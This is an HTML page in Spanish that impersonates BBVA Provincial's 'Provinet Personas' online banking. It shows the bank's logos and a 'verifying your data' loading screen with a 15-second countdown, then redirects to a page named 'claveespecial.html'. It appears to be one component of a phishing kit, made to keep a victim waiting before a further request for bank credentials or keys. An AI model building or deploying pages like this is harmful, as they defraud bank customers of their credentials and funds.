<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Cargando</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no" />
</head>
<body>

<div style="background: #072146; padding: 15px;">
    <img src="img/logo-bbva-provincial1.png" style="width: 150px" />
    <p style="color: white; font-size: 12px; font-family: Arial, Helvetica, sans-serif;">
        Acceso a Provinet Personas
    </p>
</div>

<div class="container" style="text-align: center; margin-top: 50px;">
    <h1>¡Bienvenido!</h1>
    <h1 style="font-size: 25px">Cargando</h1>
    
    <div>
        <img src="https://usagif.com/wp-content/uploads/loading-25.gif" alt="cargando" style="width: 200px" />
    </div>
    
    <h1 style="font-size: 25px">
        Estamos verificando sus datos por favor espere<br>
        <span id="countdown">15</span> segundos
    </h1>
</div>

<footer style="text-align: center; margin-top: 30vh;">
    <div style="background: #072146; padding: 20px; color: white;">
        <img src="img/bbva.png" style="width: 240px;">
    </div>
</footer>

<script>
    function startCountdown(seconds) {
        var countdownElement = document.getElementById("countdown");
        var countdownInterval = setInterval(function () {
            countdownElement.textContent = seconds;
            seconds--;
            if (seconds < 0) {
                clearInterval(countdownInterval);
                window.location.href = "claveespecial.html";
            }
        }, 1000);
    }

    document.addEventListener("DOMContentLoaded", function () {
        startCountdown(15);
    });
</script>

</body>
</html>
